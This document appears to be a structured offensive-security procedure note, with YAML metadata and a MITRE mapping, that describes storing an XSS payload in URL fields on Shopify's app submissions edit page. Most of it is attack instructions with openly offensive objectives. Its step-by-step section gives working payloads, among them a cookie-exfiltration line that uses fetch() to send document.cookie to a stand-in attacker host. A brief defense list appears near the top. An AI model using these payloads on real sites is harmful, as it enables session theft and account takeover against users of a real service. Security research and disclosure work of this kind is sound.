---
tags:
  - xss
  - payload-injection
  - stored-xss
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:33.720Z'
sub_techniques: []
id: 8acdcdbb-9fe1-4995-9839-d983c83c29c8
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-URL-Field

## Summary

This procedure details how to inject a JavaScript payload into the unsanitized DEMO URL or pricing URL fields on Shopify's app submissions edit page, storing it for later execution during previews.

## Description

The Shopify app edit page at https://apps.shopify.com/services/app_submissions/edit# lacks proper sanitization for URL inputs, allowing attackers to insert JavaScript schemes like 'javascript:alert(document.cookie)'. The payload is saved and rendered in the example store preview without escaping, executing in the browser context of apps.shopify.com. This affects any authenticated user viewing the preview, enabling session theft or data exfiltration. Requires access to the edit page via a partner app.

## Requirements

1. Access to the app submissions edit page
2. Crafted JavaScript payload (e.g., for testing or exfiltration)
3. Web browser to input and save the form

## Defense

Defensive measures and detection strategies:

- Enforce URL scheme whitelisting (e.g., only http/https)
- Sanitize inputs with HTML entity encoding before storage
- Audit app submissions for suspicious URL patterns in logs

## Objectives

1. Store malicious JavaScript without detection
2. Prepare for execution in victim browsers
3. Target multiple fields for broader impact

## Instructions

### Step 1: Locate Target Field

**Context**: Identify the vulnerable input on the edit page.

Load the edit page and scroll to the DEMO URL or pricing URL field.

> Expected output: Input field ready for entry.

### Step 2: Enter and Save Payload

**Context**: Inject the payload to bypass validation.

Input a payload such as `javascript:alert('XSS in Shopify')` or an exfiltration variant: `javascript:fetch('https://attacker-controlled-server.com/steal?data='+btoa(document.cookie))`. Click save or update.

> Expected output: No validation error; payload stored and visible in the field.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- javascript
- injection
